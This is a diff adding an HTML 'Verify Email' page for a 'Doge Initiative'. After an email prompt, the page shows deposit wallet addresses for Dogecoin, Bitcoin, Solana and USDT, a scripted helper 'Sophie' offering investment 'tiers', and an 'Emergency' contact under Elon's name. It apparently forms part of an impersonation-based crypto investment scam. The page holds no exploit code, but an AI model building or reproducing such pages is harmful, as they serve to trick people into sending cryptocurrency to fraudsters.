@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Doge Initiative - Verify Email</title>
+<link rel="stylesheet" href="styles.css" />
+<script src="scripts.js" defer></script>
+</head>
+<body>
+<header>
+  <nav>
+    <div class="logo">🚀 Doge Initiative</div>
+  </nav>
+</header>
+
+<main>
+  <section class="verify-section">
+    <h1 data-translate="verify_title">Verify Your Email to Continue</h1>
+    <p data-translate="verify_instructions">Check your inbox for the confirmation email and click the link to proceed.</p>
+    <form id="verifyEmailForm">
+      <input type="email" id="verifyEmailInput" placeholder="Enter your email" required />
+      <button type="submit" data-translate="btn_verify">Verify Email</button>
+    </form>
+
+    <div class="wallets" id="walletSection" style="display:none;">
+      <h2 data-translate="wallets_title">Deposit Wallets</h2>
+      <ul>
+        <li>Dogecoin (DOGE): <code id="dogeWallet">D91ME9KqahFu7LLySpr3nPGYY1iheCu8WX</code> <button class="copyBtn" data-target="dogeWallet">Copy</button></li>
+        <li>Bitcoin (BTC): <code id="btcWallet">bc1qxvjz6kv84awx29p75qhn7qgxtwq4xt3phc7q26</code> <button class="copyBtn" data-target="btcWallet">Copy</button></li>
+        <li>Solana (SOL): <code id="solWallet">3F2D7izX8gYkSwXwSyWoKB1dob53MDMCxqBVpPUEc8sz</code> <button class="copyBtn" data-target="solWallet">Copy</button></li>
+        <li>USDT (ERC20): <code id="usdtWallet">0x1a670b57855dE6cED8Cf659Eea8BDDcB0F4C5FE4</code> <button class="copyBtn" data-target="usdtWallet">Copy</button></li>
+      </ul>
+    </div>
+
+    <div class="agent-chat" id="agentChat" style="display:none;">
+      <p><strong>Sophie:</strong> Hi! Need help choosing a tier? I'm here to assist.</p>
+      <button id="chatCloseBtn">Close Chat</button>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <p>Contact: <a href="mailto:contact@doge-initiative.org">contact@doge-initiative.org</a> | Emergency: <a href="mailto:Elon@doge-initiative.org">Elon@doge-initiative.org</a></p>
+</footer>
+</body>
+</html>
